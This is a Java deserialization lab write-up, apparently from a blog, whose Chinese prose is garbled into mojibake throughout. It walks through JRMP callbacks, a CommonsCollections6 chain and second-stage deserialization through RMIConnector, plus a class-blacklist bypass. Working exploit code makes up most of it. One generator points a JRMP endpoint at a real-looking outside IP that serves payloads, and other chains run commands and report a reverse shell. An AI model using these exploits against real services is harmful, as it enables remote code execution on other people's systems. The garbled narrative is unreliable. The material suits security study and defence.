<p>å› ä¸ºåŠ¨æ€ä»£ç†ä¸­ç”¨åˆ°çš„æ˜¯<code>RemoteObjectInvocationHandler</code> ï¼Œå› æ­¤åœ¨ååºåˆ—åŒ–çš„æ—¶å€™å°±ä¼šè°ƒç”¨åˆ°<code>RemoteObjectInvocationHandler#readObject</code> ä½†æ˜¯è¿™ä¸ªç±»æ²¡æœ‰ï¼Œå°±ä¼šè°ƒç”¨åˆ°å…¶çˆ¶ç±»çš„<code>readObject</code> ï¼Œè€Œç”¨åˆ°çš„<code>UnicastRef</code> åœ¨è¿™é‡Œå°±ç›´æ¥è°ƒç”¨åˆ°äº†</p>
<p><img src="https://img-blog.csdnimg.cn/ceb185123bda403aa6b1e091f5bb1485.png" alt="Untitled"></p>
<p>è·Ÿè¿›<code>UnicastRef#readExternal</code> &gt;&gt; <code>LiveRef#read</code></p>
<p><img src="https://img-blog.csdnimg.cn/2ec13160f2bd426cbdefc341923ff00a.png" alt="Untitled"></p>
<p>è€Œ<code>LiveRef</code>ä¸­å¿…é¡»æœ‰çš„å€¼éƒ½å·²ç»ä¼ è¿›å»äº†</p>
<p><img src="https://img-blog.csdnimg.cn/fc41c7fb644c47129826072bed721ec8.png" alt="Untitled"></p>
<p>æœ€ç»ˆæ˜¯æ¥åˆ°äº†<code>DGCClient</code> è¿™ä¸ªç±»ï¼Œå¹¶ä¸”å°†è¿œç¨‹å¼€å¯æœåŠ¡çš„hostä»¥åŠportä¼ ç»™äº†DGCï¼Œè€Œé€šè¿‡lookupæ¥æ‰¾åˆ°ç‰¹å®šçš„å¯¹è±¡</p>
<p><img src="https://img-blog.csdnimg.cn/f89479a732e2491a9793eed8304d226c.png" alt="Untitled"></p>
<p>ä¹‹åç»§ç»­è·Ÿè¿›ï¼Œé¡ºåºå¦‚ä¹‹å‰çš„gadgetï¼Œåœ¨æœ€åè°ƒç”¨åˆ°äº†<code>StreamRemoteCall#executeCall</code>ï¼Œå°†è¿œç¨‹å‘é€è¿‡æ¥çš„åºåˆ—åŒ–ä¹‹åçš„å­—èŠ‚ç è¿›è¡Œååºåˆ—åŒ–ä»è€Œå®ç°RCE</p>
<p><img src="https://img-blog.csdnimg.cn/914357b0e1824ebe8b9bd088ba94db27.png" alt="Untitled"></p>
<h3 id="Lab3"><a href="#Lab3" class="headerlink" title="Lab3"></a>Lab3</h3><p><img src="https://img-blog.csdnimg.cn/67e3e274ae384df89737107c83bd7c32.png" alt="Untitled"></p>
<p>è¿™æ¬¡ä¾èµ–æ²¡æœ‰å˜ï¼Œä½†æ˜¯ååºåˆ—åŒ–ç”¨çš„ç±»æ˜¯é¢˜ç›®ç»™å‡ºçš„ã€‚</p>
<p>è€Œè¿™é‡Œè¦ç‚¹å°±æ˜¯resolveClassè¿›è¡Œäº†ä¿®æ”¹ï¼Œåˆ©ç”¨äº†<code>loadClass</code> </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectStreamClass;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLClassLoader;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyObjectInputStream</span> <span class="keyword">extends</span> <span class="title">ObjectInputStream</span> </span>&#123;</span><br><span class="line"><span class="keyword">private</span> ClassLoader classLoader;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">MyObjectInputStream</span><span class="params">(InputStream inputStream)</span><span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"><span class="keyword">super</span>(inputStream);</span><br><span class="line">    URL[] urls = ((URLClassLoader)Transformer.class.getClassLoader()).getURLs();</span><br><span class="line"><span class="keyword">this</span>.classLoader =<span class="keyword">new</span> URLClassLoader(urls);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> Class&lt;?&gt; resolveClass(ObjectStreamClass desc)<span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    Class&lt;?&gt; clazz =<span class="keyword">this</span>.classLoader.loadClass(desc.getName());</span><br><span class="line"><span class="keyword">return</span> clazz;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥å»åŸ<code>ObjectInputStream</code> ç±»ä¸­å¯ä»¥çœ‹åˆ°åŸæ¥çš„<code>resolveClass</code> ä¸­æ˜¯åˆ©ç”¨äº†<code>forName</code> </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> Class&lt;?&gt; resolveClass(ObjectStreamClass desc)</span><br><span class="line">    <span class="keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="line">&#123;</span><br><span class="line">    String name = desc.getName();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> Class.forName(name, <span class="keyword">false</span>,latestUserDefinedLoader());</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassNotFoundException ex) &#123;</span><br><span class="line">        Class&lt;?&gt; cl =primClasses.get(name);</span><br><span class="line">        <span class="keyword">if</span> (cl != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> cl;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> ex;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è€Œåœ¨å‰é¢å­¦shiroçš„æ—¶å€™å¯ä»¥å‘ç°å¦‚æœæ˜¯åŠ è½½å™¨çš„loadClassçš„æ—¶å€™å¦‚æœååºåˆ—åŒ–æµä¸­åŒ…å«éjavaè‡ªèº«çš„æ•°ç»„å°±ä¼šå‡ºç°æ— æ³•åŠ è½½ç±»çš„é”™è¯¯ï¼Œè€ŒåŸç±»çš„forNameå°±ä¸ä¼šè¿™æ ·</p>
<p><img src="https://img-blog.csdnimg.cn/c39b3347f2454e808ee2a9a482a526eb.png" alt="Untitled"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">    Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;&#125;;</span><br><span class="line"></span><br><span class="line">    System.out.println(Class.forName(transformers.getClass().getName()));</span><br><span class="line"></span><br><span class="line">    URL[] urls = ((URLClassLoader) Transformer.class.getClassLoader()).getURLs();</span><br><span class="line">    Index index = <span class="keyword">new</span> Index();</span><br><span class="line">    index.classLoader =<span class="keyword">new</span> URLClassLoader(urls);</span><br><span class="line"></span><br><span class="line">    System.out.println(index.classLoader.loadClass(transformers.getClass().getName()));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// class [Lorg.apache.commons.collections.Transformer;</span></span><br><span class="line"><span class="comment">// Exception in thread &quot;main&quot; java.lang.ClassNotFoundException: [Lorg.apache.commons.collections.Transformer;</span></span><br><span class="line"><span class="comment">//	at java.net.URLClassLoader.findClass(URLClassLoader.java:381)</span></span><br><span class="line"><span class="comment">//	at java.lang.ClassLoader.loadClass(ClassLoader.java:424)</span></span><br><span class="line"><span class="comment">//	at java.lang.ClassLoader.loadClass(ClassLoader.java:357)</span></span><br><span class="line"><span class="comment">//	at lab3.Index.main(Index.java:30)</span></span><br></pre></td></tr></table></figure>

<p>å¯ä»¥åˆ©ç”¨JRMPæ‰“ï¼Œè¿™é‡Œåˆ©ç”¨ç¬¬äºŒç§æ–¹æ³•</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> lab3;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> lab1.Utils;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.server.UnicastRef;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.transport.LiveRef;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.transport.tcp.TCPEndpoint;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.ObjID;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.RemoteObjectInvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JrmpListener</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        ObjID objID = <span class="keyword">new</span> ObjID(<span class="keyword">new</span> Random().nextInt()); <span class="comment">// å¯¹è±¡æ ‡è¯†ç¬¦</span></span><br><span class="line">        TCPEndpoint tcpEndpoint = <span class="keyword">new</span> TCPEndpoint(<span class="string">&quot;82.156.2.166&quot;</span>,<span class="number">2444</span>); <span class="comment">// ä¸è¿œç¨‹çš„RMIæœåŠ¡è¿æ¥</span></span><br><span class="line">        UnicastRef unicastRef = <span class="keyword">new</span> UnicastRef(<span class="keyword">new</span> LiveRef(objID, tcpEndpoint, <span class="keyword">false</span>)); <span class="comment">// \</span></span><br><span class="line">        RemoteObjectInvocationHandler rih = <span class="keyword">new</span> RemoteObjectInvocationHandler(unicastRef);</span><br><span class="line">        Registry registry = (Registry) Proxy.newProxyInstance(JrmpListener.class.getClassLoader(), <span class="keyword">new</span> Class[]&#123;Registry.class&#125;, rih); <span class="comment">// é€šè¿‡åŠ¨æ€ä»£ç†å®ä¾‹åŒ–Registryæ¥å£</span></span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream bos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream os = <span class="keyword">new</span> ObjectOutputStream(bos);</span><br><span class="line">        os.writeUTF(<span class="string">&quot;SJTU&quot;</span>);</span><br><span class="line">        os.writeInt(<span class="number">1896</span>);</span><br><span class="line">        os.writeObject(registry);</span><br><span class="line">        os.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(Utils.bytesTohexString(bos.toByteArray()));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>vpsä¸Šåˆ©ç”¨ysoå¼€JRMPæœåŠ¡ï¼Œå¹¶ç”¨CC6ç”Ÿæˆå‘½ä»¤</p>
<p><img src="https://img-blog.csdnimg.cn/7a9e20d640fe4a9f908dec7651cb3524.png" alt="Untitled"></p>
<p><img src="https://img-blog.csdnimg.cn/2f5ebfc5e2bc4d9b9cc9544730ba516f.png" alt="Untitled"></p>
<p>ç»“æœï¼š</p>
<p><img src="https://img-blog.csdnimg.cn/da6a61818ca3442da72a4a9cebc24f4a.png" alt="Untitled"></p>
<p>é—®é¢˜ï¼š</p>
<ol>
<li>æ¯æ‰“ä¸€æ¬¡payloadéƒ½è¦é‡å¯ç¯å¢ƒï¼Œä¸ç„¶æ²¡æœ‰ç”¨</li>
<li>ä¸çŸ¥é“ä¸ºä»€ä¹ˆä¸èƒ½åå¼¹shell</li>
</ol>
<h2 id="Lab4-shiro-blind"><a href="#Lab4-shiro-blind" class="headerlink" title="Lab4-shiro-blind"></a>Lab4-shiro-blind</h2><p>åœ¨docker-compose.ymlä¸­è¢«è®¾ç½®äº†ä¸å¯å‡ºç½‘ï¼Œå¯¼è‡´ä¸Šé¢çš„JRMPä¸å¯åˆ©ç”¨ï¼Œä½†æ˜¯è¿™é‡Œååºåˆ—åŒ–è¿˜æ˜¯è¿›è¡Œäº†é‡å†™ï¼Œè¯´æ˜è¿˜æ˜¯ä¸å¯ä»¥åˆ©ç”¨éjavaåŸç”Ÿç±»ä¹Ÿå°±æ˜¯ä¸èƒ½ä½¿ç”¨å­˜åœ¨Transformeæ•°ç»„çš„é“¾å­ã€‚ä¸å¯å‡ºç½‘+ä¸èƒ½ä½¿ç”¨æ•°ç»„è¯´æ˜æœ€å¥½è¿˜æ˜¯éœ€è¦åˆ©ç”¨äºŒæ¬¡ååºåˆ—åŒ–ç»•è¿‡</p>
<h3 id="RMIConnector"><a href="#RMIConnector" class="headerlink" title="RMIConnector"></a>RMIConnector</h3><p><code>findRMIServerJRMP</code> æ–¹æ³•ä¸­ä¼šå¯¹ä¼ è¿›å»çš„base64å­—ç¬¦ä¸²è¿›è¡Œè§£ç å¹¶è¿›è¡ŒäºŒæ¬¡ååºåˆ—åŒ–ï¼Œå®ç°æˆ‘ä»¬çš„äºŒæ¬¡ååºåˆ—åŒ–è¿›è¡ŒRCE</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> RMIServer <span class="title">findRMIServerJRMP</span><span class="params">(String base64, Map&lt;String, ?&gt; env, <span class="keyword">boolean</span> isIiop)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="comment">// could forbid &quot;iiop:&quot; URL here -- but do we need to?</span></span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">byte</span>[] serialized;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        serialized =base64ToByteArray(base64);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IllegalArgumentException e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> MalformedURLException(<span class="string">&quot;Bad BASE64 encoding: &quot;</span> +</span><br><span class="line">                e.getMessage());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">final</span> ByteArrayInputStream bin = <span class="keyword">new</span> ByteArrayInputStream(serialized);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">final</span> ClassLoader loader = EnvHelp.resolveClientClassLoader(env);</span><br><span class="line">    <span class="keyword">final</span> ObjectInputStream oin =</span><br><span class="line">            (loader == <span class="keyword">null</span>) ?</span><br><span class="line">                <span class="keyword">new</span> ObjectInputStream(bin) :</span><br><span class="line">                <span class="keyword">new</span> ObjectInputStreamWithLoader(bin, loader);</span><br><span class="line">    <span class="keyword">final</span> Object stub;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        stub = oin.readObject();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> MalformedURLException(<span class="string">&quot;Class not found: &quot;</span> + e);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> (RMIServer)stub;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è€Œåœ¨æ„é€ å‡½æ•°çš„æ³¨é‡Šä¸Šå¯ä»¥çŸ¥é“æˆ‘éœ€è¦æ„é€ çš„payloadä¸ºï¼Œå…¶ä¸­<code>encoded-stub</code> å°±æ˜¯base64ç¼–ç ä¹‹åçš„CC6payload</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">service:jmx:rmi:<span class="comment">//[host[:port]]/stub/encoded-stub</span></span><br></pre></td></tr></table></figure>

<h3 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h3><p>gadget:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">connect()</span><br><span class="line">	connect(Map&lt;String,?&gt; environment)</span><br><span class="line">			findRMIServer(JMXServiceURL directoryURL,Map&lt;String, Object&gt; environment)</span><br><span class="line">				findRMIServerJRMP(String base64, Map&lt;String, ?&gt; env, boolean isIiop)</span><br></pre></td></tr></table></figure>

<p>exp:ï¼ˆä»¥cc6ä¸ºä¾‹</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> lab4;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.remote.JMXServiceURL;</span><br><span class="line"><span class="keyword">import</span> javax.management.remote.rmi.RMIConnector;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.OutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exp</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Transformer[] fakeTrans = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>)</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">          <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">          <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> Class[]&#123;String.class, Class[].class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>]&#125;),</span><br><span class="line">          <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>]&#125;),</span><br><span class="line">          <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class&#125;, <span class="keyword">new</span> String[]&#123;<span class="string">&quot;calc&quot;</span>&#125;),</span><br><span class="line">          <span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        Transformer transformer = <span class="keyword">new</span> ChainedTransformer(fakeTrans );</span><br><span class="line">        Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        Map outMap = LazyMap.decorate(innerMap, transformer);</span><br><span class="line">        TiedMapEntry tiedMapEntry = <span class="keyword">new</span> TiedMapEntry(outMap, <span class="string">&quot;a&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Map exp = <span class="keyword">new</span> HashMap();</span><br><span class="line">        exp.put(tiedMapEntry, <span class="string">&quot;b&quot;</span>);</span><br><span class="line">        outMap.remove(<span class="string">&quot;a&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Field field = ChainedTransformer.class.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(transformer, transformers);</span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream bos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(bos);</span><br><span class="line">        oos.writeObject(exp);</span><br><span class="line">        oos.close();</span><br><span class="line">        <span class="keyword">byte</span>[] bytes = bos.toByteArray();</span><br><span class="line"></span><br><span class="line">        System.out.println(Base64.getEncoder().encodeToString(bytes));</span><br><span class="line"></span><br><span class="line">        RMIConnector rmiConnector = <span class="keyword">new</span> RMIConnector(<span class="keyword">new</span> JMXServiceURL(<span class="string">&quot;service:jmx:rmi://127.0.0.1:12345/stub/&quot;</span>+Base64.getEncoder().encodeToString(bytes)), <span class="keyword">null</span>);</span><br><span class="line">        rmiConnector.connect();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="Lab4"><a href="#Lab4" class="headerlink" title="Lab4"></a>Lab4</h3><p>exp:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> lab4;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> lab1.Utils;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.remote.JMXServiceURL;</span><br><span class="line"><span class="keyword">import</span> javax.management.remote.rmi.RMIConnector;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exp</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Transformer[] fakeTrans = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>)</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">          <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">          <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> Class[]&#123;String.class, Class[].class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>]&#125;),</span><br><span class="line">          <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>]&#125;),</span><br><span class="line">          <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class&#125;, <span class="keyword">new</span> String[]&#123;<span class="string">&quot;touch /tmp/ameuu&quot;</span>&#125;),</span><br><span class="line">          <span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        Transformer transformer = <span class="keyword">new</span> ChainedTransformer(fakeTrans);</span><br><span class="line">        Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        Map outMap = LazyMap.decorate(innerMap, transformer);</span><br><span class="line">        TiedMapEntry tiedMapEntry = <span class="keyword">new</span> TiedMapEntry(outMap, <span class="string">&quot;aa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Map exp = <span class="keyword">new</span> HashMap();</span><br><span class="line">        exp.put(tiedMapEntry, <span class="string">&quot;bb&quot;</span>);</span><br><span class="line"></span><br><span class="line">        outMap.remove(<span class="string">&quot;aa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Field field = ChainedTransformer.class.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(transformer, transformers);</span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream bos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(bos);</span><br><span class="line">        oos.writeObject(exp);</span><br><span class="line">        oos.close();</span><br><span class="line">        <span class="keyword">byte</span>[] bytes = bos.toByteArray();</span><br><span class="line"></span><br><span class="line">        RMIConnector rmiConnector = <span class="keyword">new</span> RMIConnector(<span class="keyword">new</span> JMXServiceURL(<span class="string">&quot;service:jmx:rmi://127.0.0.1:12345/stub/&quot;</span>+Base64.getEncoder().encodeToString(bytes)), <span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">        Map map = <span class="keyword">new</span> HashMap();</span><br><span class="line">        Transformer invoke = <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;toString&quot;</span>, <span class="keyword">null</span>, <span class="keyword">null</span>);</span><br><span class="line">        Map map1 = LazyMap.decorate(map, invoke);</span><br><span class="line">        TiedMapEntry tiedMapEntry1 = <span class="keyword">new</span> TiedMapEntry(map1, rmiConnector);</span><br><span class="line">        Map exp1 = <span class="keyword">new</span> HashMap();</span><br><span class="line">        exp1.put(tiedMapEntry1, <span class="string">&quot;aa&quot;</span>);</span><br><span class="line">        map1.remove(rmiConnector);</span><br><span class="line"></span><br><span class="line">        Field field1 = InvokerTransformer.class.getDeclaredField(<span class="string">&quot;iMethodName&quot;</span>);</span><br><span class="line">        field1.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field1.set(invoke, <span class="string">&quot;connect&quot;</span>);</span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream b = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream o = <span class="keyword">new</span> ObjectOutputStream(b);</span><br><span class="line">        o.writeUTF(<span class="string">&quot;SJTU&quot;</span>);</span><br><span class="line">        o.writeInt(<span class="number">1896</span>);</span><br><span class="line">        o.writeObject(exp1);</span><br><span class="line">        System.out.println(Utils.bytesTohexString(b.toByteArray()));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç»“æœï¼š</p>
<p><img src="https://img-blog.csdnimg.cn/02dcd7f2a417483694d7aec850daede0.png" alt="Untitled"></p>
<p>åå¼¹shellï¼š</p>
<p><img src="https://img-blog.csdnimg.cn/4c4d5d7bcae5461ca6a47490a0553272.png" alt="Untitled"></p>
<h2 id="Lab5-weblogic-readResolve"><a href="#Lab5-weblogic-readResolve" class="headerlink" title="Lab5-weblogic-readResolve"></a>Lab5-weblogic-readResolve</h2><p>æ¯”lab4å¤šäº†ä¸¤ä¸ªé»‘åå•ï¼Œè¿™ä½¿å¾—åˆæ¬¡ååºåˆ—åŒ–çš„æ—¶å€™ä¸èƒ½ç”¨åˆ°ç›¸åº”çš„æ–¹æ³•ï¼Œè€Œæˆ‘ä»¬å¯ä»¥å‘ç°<code>InvokerTransformer</code> å’Œ<code>ConstantTransformer</code> ç­‰ç±»éƒ½ä¸å¯ä»¥ä½¿ç”¨ï¼Œæ‰€ä»¥lab4åˆ©ç”¨çš„expæ˜¯ä¸èƒ½åˆ©ç”¨äº†ï¼Œä½†æ˜¯è¿˜æ˜¯éœ€è¦äºŒæ¬¡ååºåˆ—åŒ–</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">blackList.add(<span class="string">&quot;org.apache.commons.collections.functors&quot;</span>);</span><br><span class="line">blackList.add(<span class="string">&quot;java.rmi.server&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥å‘ç°å­˜åœ¨ç±»<code>MarshalledObject</code> ï¼Œå…¶æ–¹æ³•<code>readResolve</code> å®ç°äº†æ²¡æœ‰ä»»ä½•é™åˆ¶çš„ååºåˆ—åŒ–ï¼Œæ‰€ä»¥åªè¦æˆ‘ä»¬å¯¹è¿™ä¸ªç±»è¿›è¡Œååºåˆ—åŒ–å¹¶ä¸”èƒ½å¤Ÿè°ƒç”¨åˆ°è¯¥æ–¹æ³•å°±å¯ä»¥å®ç°äºŒæ¬¡ååºåˆ—åŒ–RCE</p>
